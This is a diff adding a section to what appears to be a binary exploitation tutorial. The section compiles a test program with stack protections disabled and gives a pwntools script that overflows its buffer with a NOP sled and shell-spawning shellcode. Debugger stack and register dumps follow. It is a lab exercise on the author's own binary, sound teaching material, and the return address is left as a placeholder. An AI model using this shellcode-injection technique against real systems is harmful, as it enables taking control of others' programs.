@@ -331,9 +331,138 @@ We can see that EBP points out to `0xff809568`, which means that the return `ret
 
 Thereby, we took control of the EIP.
 
+#### Trying to execute a shellcode
+Let's compile the program without NX protection:
+```bash
+gcc -m32 -g -fno-stack-protector -z execstack -static -o ./build/1_nx ./src/1_static.c
+```
+Which we can verify as:
+```bash
+root@9d3c62865471:~/tutorial# checksec build/1_static
+[*] '/root/tutorial/build/1_static'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+root@9d3c62865471:~/tutorial# checksec build/1_staticnx
+[*] '/root/tutorial/build/1_staticnx'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+Now, we simply overflow it making sure we append and prepend Noops to the shellcode.
+We use following script (`1_skeleton_shellcode.py`):
+
+```python
+#!/usr/bin/python
+from pwn import *
+# Define the context of the working machine
+context(arch='i386', os='linux')
+
+def main():
+    # Start the process
+    log.info("Launching the process")
+    p = process("../build/1_static")
+
+    # Get a simple shellcode
+    log.info("Putting together simple shellcode")
+    shellcode = asm(shellcraft.sh())
+    # print(len(shellcode))
+    print(asm(shellcraft.sh()))
+
+    # Craft the payload
+    log.info("Crafting the payload")
+    # payload = "A"*148
+    payload = "\x90"*86    # no op code
+    payload += shellcode   # 44 chars
+    payload += "\x90"*18    # no op code
+    payload += p32(0xdeadc0de)
+    # payload += "\x90"*500    # no op code
+    payload = payload.ljust(2000, "\x00")
+    # log.info(payload)
+
+    # Print the process id
+    raw_input(str(p.proc.pid))
+
+    # Send the payload
+    p.send(payload)
+
+    # Transfer interaction to the user
+    p.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
+which gets us a situation like:
+```bash
+[ SOURCE (CODE) ]
+    9     char * second_buffer;
+   10     uint32_t length = 0;
+   11     puts("Reading from STDIN");
+   12     read(0, buffer, 1024);
+   13
+ ► 14     if (strcmp(buffer, "Cool Input") == 0) {
+   15         puts("What a cool string.");
+   16     }
+   17     length = strlen(buffer);
+   18     if (length == 42) {
+   19         puts("LUE");
+[ STACK ]
+00:0000│ esp  0xff9abbe0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— xchg   dword ptr [eax], ebp /* 0xfbad2887 */
+01:0004│      0xff9abbe4 —▸ 0x80bee20 ◂— push   esp
+02:0008│ ecx  0xff9abbe8 ◂— 0x90909090
+... ↓
+[ BACKTRACE ]
+ ► f 0  80488d5 vuln+57
+   f 1 deadc0de
+   f 2        0
+Breakpoint /root/tutorial/src/1_staticnx.c:14
+pwndbg> stack 50
+00:0000│ esp  0xff9abbe0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— xchg   dword ptr [eax], ebp /* 0xfbad2887 */
+01:0004│      0xff9abbe4 —▸ 0x80bee20 ◂— push   esp
+02:0008│ ecx  0xff9abbe8 ◂— 0x90909090
+... ↓
+17:005c│      0xff9abc3c ◂— 0x686a9090
+18:0060│      0xff9abc40 ◂— 0x2f2f2f68 ('h///')
+19:0064│      0xff9abc44 ◂— 0x622f6873 ('sh/b')
+1a:0068│      0xff9abc48 ◂— 0xe3896e69
+1b:006c│      0xff9abc4c ◂— 0x1010168
+1c:0070│      0xff9abc50 ◂— 0x24348101
+1d:0074│      0xff9abc54 ◂— 0x1016972
+1e:0078│      0xff9abc58 ◂— 0x6a51c931
+1f:007c│      0xff9abc5c ◂— 0xe1015904
+20:0080│      0xff9abc60 ◂— 0x31e18951
+21:0084│      0xff9abc64 ◂— 0x580b6ad2
+22:0088│      0xff9abc68 ◂— 0x909080cd
+23:008c│      0xff9abc6c ◂— 0x90909090
+... ↓
+27:009c│      0xff9abc7c ◂— 0xdeadc0de
+28:00a0│      0xff9abc80 ◂— 0x0
+... ↓
+pwndbg> regs
+*EAX  0x400
+*EBX  0x80481b0 (_init) ◂— push   ebx
+ ECX  0xff9abbe8 ◂— 0x90909090
+ EDX  0x400
+ EDI  0x4e
+ ESI  0x80ef00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069d70 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
+ EBP  0xff9abc78 ◂— 0x90909090
+*ESP  0xff9abbe0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— xchg   dword ptr [eax], ebp /* 0xfbad2887 */
+*EIP  0x80488d5 (vuln+57) ◂— sub    esp, 8
+
+```
+
+Problem now is how to modify `0xdeadc0de` by something that falls on the Noop section
+#### Code Gadgets
 
 
 ### Bibliography
 - [1] Linux exploitation course. Retrieved from https://github.com/nnamon/linux-exploitation-course.
 - [2] Bypassing NX with Return Oriented Programming. Retrieved from https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/6_bypass_nx_rop/lessonplan.md.
 - [3] pwndebug. Retrieved from https://github.com/pwndbg/pwndbg.
+- [4] Why do we have to put the shellcode before the return address in the buffer overflow? Retreived from https://security.stackexchange.com/questions/101222/why-do-we-have-to-put-the-shellcode-before-the-return-address-in-the-buffer-over?rq=1.
